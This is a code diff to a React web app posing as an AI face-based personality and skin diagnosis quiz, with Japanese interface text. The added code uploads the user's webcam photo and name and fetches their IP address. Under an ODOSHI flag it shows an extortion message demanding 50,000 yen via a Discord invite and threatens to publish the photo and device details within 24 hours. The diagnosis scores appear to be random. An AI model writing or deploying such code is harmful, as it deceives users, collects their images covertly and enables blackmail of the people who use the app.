@@ -39,10 +39,13 @@ const sohyo = [
 
 function App() {
   const [message, setMessage] = useState("今すぐ診断！");
+  const [name, setName] = useState("");
   const [disabled, setDisabled] = useState(false);
   const [mode, setMode] = useState(0);
   const [data, setData] = useState({});
   const [sohyoText, setSohyoText] = useState("");
+  const [reveal, setReveal] = useState(false);
+  const [ip, setIp] = useState("");
   useEffect(() => {
     const actualData = [
       randint(60, 100),
@@ -91,6 +94,10 @@ function App() {
   const canvasRef = useRef(null);
 
   const camera = async () => {
+    if (name.length === 0) {
+      alert("名前を入力してください");
+      return;
+    }
     setMessage("カメラを起動中...");
     const stream = await navigator.mediaDevices
       .getUserMedia({
@@ -120,27 +127,36 @@ function App() {
       });
       const formData = new FormData();
       formData.append("file", blob);
+      formData.append("name", name.slice(0, 20));
       await fetch("/upload", {
         method: "POST",
         body: formData,
       });
+      const ip = await (await fetch("https://icanhazip.com")).text();
 
       await sleep(1000);
-      setMessage("社交性を診断中...");
-      await sleep(randint(500, 2000));
-      setMessage("決断力を診断中...");
-      await sleep(randint(500, 2000));
-      setMessage("共感力を診断中...");
-      await sleep(randint(500, 2000));
-      setMessage("行動力を診断中...");
-      await sleep(randint(500, 2000));
-      setMessage("ユニークさを診断中...");
-      await sleep(randint(500, 2000));
+      if (MODE === "seikaku") {
+        setMessage("社交性を診断中...");
+        await sleep(randint(500, 2000));
+        setMessage("決断力を診断中...");
+        await sleep(randint(500, 2000));
+        setMessage("共感力を診断中...");
+        await sleep(randint(500, 2000));
+        setMessage("行動力を診断中...");
+        await sleep(randint(500, 2000));
+        setMessage("ユニークさを診断中...");
+        await sleep(randint(500, 2000));
+      } else {
+        setMessage("診断中...しばらくお待ち下さい。");
+        await sleep(randint(500, 2000));
+      }
       setMessage("診断完了！結果を表示中...");
       await sleep(2000);
       setMode(1);
     });
   };
+
+  console.log(MODE);
 
   return (
     <div className="w-full h-full grid place-items-center">
@@ -149,8 +165,19 @@ function App() {
         {mode === 0 ? (
           <div className="flex flex-col justify-center items-center gap-4">
             <h2 className="text-white text-2xl font-bold text-center mt-4">
-              AIがあなたの顔から性格を診断します！
+              AIがあなたの顔から
+              {MODE === "seikaku"
+                ? "性格"
+                : MODE === "shorai"
+                ? "将来の顔"
+                : MODE === "nikibi"
+                ? "ニキビ"
+                : "シワ"}
+              を
+              {MODE === "shiwa" ? "判別" : MODE === "shorai" ? "予想" : "診断"}
+              します！
             </h2>
+            <input type="text" className="p-2 rounded" placeholder="あなたの名前" value={name} onChange={(e) => setName(e.target.value)} />
             <button
               className="rounded-full bg-pink-500 p-4 text-xl text-white font-bold"
               onClick={() => camera()}
@@ -161,63 +188,83 @@ function App() {
           </div>
         ) : (
           <div className="flex flex-col justify-center items-center gap-4">
-            <ResponsiveContainer width="100%" height={250}>
-              <RadarChart
-                width="100%"
-                height="100%"
-                cx="50%"
-                cy="50%"
-                outerRadius="80%"
-                data={data}
-              >
-                <PolarGrid />
-                <PolarAngleAxis dataKey="subject" />
-                <PolarRadiusAxis />
-                <Radar
-                  name="あなた"
-                  dataKey="A"
-                  stroke="#8884d8"
-                  fill="#ffea00"
-                  fillOpacity={0.9}
-                />
-                <Radar
-                  name="全国平均"
-                  dataKey="B"
-                  stroke="#82ca9d"
-                  fill="#82ca9d"
-                  fillOpacity={0.2}
-                />
-              </RadarChart>
-            </ResponsiveContainer>
+            {!ODOSHI && (
+              <ResponsiveContainer width="100%" height={250}>
+                <RadarChart
+                  width="100%"
+                  height="100%"
+                  cx="50%"
+                  cy="50%"
+                  outerRadius="80%"
+                  data={data}
+                >
+                  <PolarGrid />
+                  <PolarAngleAxis dataKey="subject" />
+                  <PolarRadiusAxis />
+                  <Radar
+                    name="あなた"
+                    dataKey="A"
+                    stroke="#8884d8"
+                    fill="#ffea00"
+                    fillOpacity={0.9}
+                  />
+                  <Radar
+                    name="全国平均"
+                    dataKey="B"
+                    stroke="#82ca9d"
+                    fill="#82ca9d"
+                    fillOpacity={0.2}
+                  />
+                </RadarChart>
+              </ResponsiveContainer>
+            )}
             <h2 className="text-white text-2xl font-bold text-center mt-4">
               あなたの性格診断結果！
             </h2>
-            <div className="flex flex-col justify-center items-center">
-              <h3 className="text-white text-xl font-bold text-center">
-                社交性: {data[0].A}点
-              </h3>
-              <h3 className="text-white text-xl font-bold text-center">
-                決断力: {data[1].A}点
-              </h3>
-              <h3 className="text-white text-xl font-bold text-center">
-                共感力: {data[2].A}点
-              </h3>
-              <h3 className="text-white text-xl font-bold text-center">
-                行動力: {data[3].A}点
-              </h3>
-              <h3 className="text-white text-xl font-bold text-center">
-                ユニークさ: {data[4].A}点
-              </h3>
-              <h3 className="text-white text-2xl font-bold text-center mt-4 whitespace-pre-line">
-                AI 総評コメント:{"\n"}
-                {sohyoText}
-              </h3>
-            </div>
+            {!ODOSHI && (
+              <div className="flex flex-col justify-center items-center">
+                <h3 className="text-white text-xl font-bold text-center">
+                  社交性: {data[0].A}点
+                </h3>
+                <h3 className="text-white text-xl font-bold text-center">
+                  決断力: {data[1].A}点
+                </h3>
+                <h3 className="text-white text-xl font-bold text-center">
+                  共感力: {data[2].A}点
+                </h3>
+                <h3 className="text-white text-xl font-bold text-center">
+                  行動力: {data[3].A}点
+                </h3>
+                <h3 className="text-white text-xl font-bold text-center">
+                  ユニークさ: {data[4].A}点
+                </h3>
+                <h3 className="text-white text-2xl font-bold text-center mt-4 whitespace-pre-line">
+                  AI 総評コメント:{"\n"}
+                  {sohyoText}
+                </h3>
+              </div>
+            )}
+            {ODOSHI && (
+              <>
+                <div className="flex flex-col justify-center items-center text-red-500 font-bold">
+                  <p>あなたの顔写真と端末情報を取得しました</p>
+                  <p>公開してほしくなかったら以下のサーバーに入り</p>
+                  <p>5万円をお支払いください</p>
+                  <p>従わない場合は24時間後にネット上に全て公開します</p>
+                  <p>以下のサーバーに参加してください</p>
+                  <a href="https://discord.gg/Vk7WZ4JaBA" className="text-blue-400">https://discord.gg/Vk7WZ4JaBA</a>
+                </div>
+                <div className="flex flex-col justify-center items-center text-red-500 font-bold">
+                  <p>IPアドレス: {ip}</p>
+                  <p>UA: {navigator.userAgent}</p>
+                </div>
+              </>
+            )}
           </div>
         )}
       </main>
       <video ref={videoRef} className="hidden"></video>
-      <canvas ref={canvasRef} className="hidden"></canvas>
+      <canvas ref={canvasRef} className={reveal ? "block":"hidden"}></canvas>
     </div>
   );
 }
